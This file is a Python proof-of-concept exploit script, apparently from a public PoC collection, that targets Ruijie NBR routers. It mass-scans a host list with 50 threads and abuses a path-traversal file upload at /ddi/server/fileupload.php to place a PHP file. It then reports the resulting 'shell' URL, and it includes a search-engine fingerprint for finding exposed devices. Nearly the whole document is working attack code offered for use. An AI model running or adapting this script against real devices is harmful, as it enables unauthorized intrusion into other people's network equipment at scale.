#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# app="Ruijie-NBR路由器" && icon_hash="-692947551"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 Ruijie_NBR_FileUpload_Poc.py url.txt                                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8081'
}  
requests.packages.urllib3.disable_warnings()

def exp(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Content-Disposition": "form-data; name=\"file\"; filename=\"test.php\"",
        "Host": "%s" %host2,
        "Content-Type": "image/jpeg",
        "Accept-Encoding": "gzip, deflate"
    }
    vulurl = url + "/ddi/server/fileupload.php?uploadDir=../../test&name=test.php"
    data='test'
    try:
        r = requests.post(vulurl, data=data,headers=headers,verify=False,proxies=proxysdata)
        #print(r.text)
        if "test" in r.text :
            print("shell地址为："+url+"/test/test.php")     
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])